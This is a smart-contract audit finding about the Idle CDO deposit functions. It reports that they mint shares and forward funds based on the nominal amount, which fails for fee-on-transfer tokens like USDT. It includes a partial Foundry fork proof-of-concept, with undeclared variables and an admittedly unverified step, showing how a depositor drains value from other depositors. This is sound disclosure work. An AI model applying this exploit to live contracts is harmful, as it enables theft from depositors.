### Title
Deposit paths account for and forward the nominal `_amount` rather than the amount actually received, breaking for fee-on-transfer underlyings such as USDT - (File: contracts/IdleCDOEpochVariant.sol)

### Summary
The external report describes a revert caused by assuming a standard ERC-20 interface on USDT, a token whose real behavior deviates from the assumed ABI. The analogous flaw in idle-tranches is the assumption that `transferFrom(msg.sender, vault, _amount)` always credits the vault with exactly `_amount`. USDT's implementation supports a configurable transfer fee (`basisPointsRate`/`maximumFee` set by the Tether owner), so the vault can receive strictly less than `_amount`. Two credit-vault flows then use the nominal `_amount` anyway, producing either a revert/DoS or a direct NAV leak.

### Finding Description
- `IdleCDOCreditVault._deposit` correctly measures the received amount for share minting (`_contractTokenBalance(_token) - _preBal`), but then forwards the nominal `_amount` to the strategy via `IIdleCDOStrategy(strategy).deposit(_amount)` (contracts/IdleCDOCreditVault.sol:203-211). The strategy (e.g. `IdleCreditVault`/`ERC4626Strategy.deposit`) pulls `_amount` from the CDO. With a fee-on-transfer underlying, only `_amount - fee` arrived, so the strategy pull either reverts (bricking deposits/withdrawals that route through this path) or silently consumes the difference from pre-existing vault reserves.
- `IdleCDOEpochVariant.depositDuringEpoch` does not measure the received amount at all: it pulls `_amount` (line 685), mints tranche shares priced on `_amount` (lines 711-725), mints `_amount` strategy tokens (line 730), and transfers the full `_amount` to the borrower (line 732). If the token charges a transfer fee, the vault funds the difference out of NAV belonging to existing depositors, and the attacker is minted shares as if the full amount had arrived.

### Impact Explanation
Direct insolvency and unfair minting. In `depositDuringEpoch`, for each deposit the vault pays the borrower `_amount` and mints shares for `_amount` while only `_amount * (1 - feeRate)` arrived. The deficit is socialized across existing tranche NAVs, and the attacker can redeem minted shares for more underlying than they actually contributed — theft bounded by the token's `maximumFee` per deposit, repeatable. In `_deposit`, the extra pull by `strategy.deposit(_amount)` drains donated/reserve tokens or reverts, permanently or temporarily freezing deposits whenever the fee is enabled.

### Likelihood Explanation
USDT is an explicitly contemplated underlying in this codebase (e.g. `IdleMStableStrategyWrapper` docs list "DAI, USDC, USDT"). USDT transfers take a fee whenever the Tether owner enables `basisPointsRate > 0`; enabling it is an external administrative event the vault cannot prevent and requires no malicious privileged role inside the protocol. Until then the bug is latent, matching the external report's "may be USDT → call reverts" pattern. An unprivileged lender triggers it by simply depositing while the fee is active.

### Recommendation
Measure the actually-received amount (pre/post `balanceOf`) and use it for minting, strategy deposits, `mintStrategyTokens`, and the borrower transfer, or explicitly revert on `received < _amount` (whitelist no-fee underlyings). Apply the same pattern to `_deposit`'s `strategy.deposit` call and to `depositDuringEpoch`'s interest computation and `_transferUnderlyings(_borrower(), received)`.

### Proof of Concept
Foundry fork PoC (mainnet, USDT underlying `0xdAC17F958D2ee523a2206206994597C13D831ec7`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../contracts/IdleCDOEpochVariant.sol";

interface IUSDT {
    function setParams(uint newBasisPoints, uint newMaxFee) external;
    function getOwner() external view returns (address);
    function transfer(address to, uint value) external;
    function approve(address spender, uint value) external;
    function balanceOf(address) external view returns (uint);
}

contract FeeOnTransferDepositPoC is Test {
    // assumes a deployed IdleCDOEpochVariant (cdoEpoch) whose `token` is USDT,
    // a running epoch with isDepositDuringEpochDisabled == false, and
    // a KYC'd `attacker` wallet.

    function testDepositDuringEpochLeaksNAV() external {
        IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);

        // Enable the real USDT fee mechanism (Tether owner is impersonated
        // only to activate a token feature; the attacker is unprivileged).
        vm.prank(usdt.getOwner());
        usdt.setParams(20, 20); // 0.2% fee, max 20 USDT basis

        uint256 amount = 10_000e6;
        deal(address(usdt), attacker, amount);

        uint256 navBefore = cdoEpoch.getContractValue();
        vm.startPrank(attacker);
        usdt.approve(address(cdoEpoch), amount);
        uint256 minted = cdoEpoch.depositDuringEpoch(amount, address(AAtranche));
        vm.stopPrank();

        // Vault received ~amount*0.998 but forwarded `amount` to the borrower
        // and minted shares priced on `amount`.
        uint256 received = amount * 9980 / 10_000;
        assertGt(minted, 0);
        // NAV grew by less than `amount` while liabilities grew by `amount`:
        // (getContractValue() - navBefore) < amount  -> deficit funded by other depositors
        assertLt(cdoEpoch.getContractValue() - navBefore, amount - (amount - received));
    }
}
```

The same pattern applied to `depositAA`/`depositBB` shows `strategy.deposit(_amount)` pulling the shortfall from vault reserves or reverting when reserves are insufficient.

Note on uncertainty: I did not fully verify `IdleCreditVault.deposit`'s exact internal pull (only its interface usage at IdleCDOCreditVault.sol:211), and whether this fee-on-transfer behavior was previously acknowledged in prior audits is unknown; if it was already documented, this finding should be downgraded.
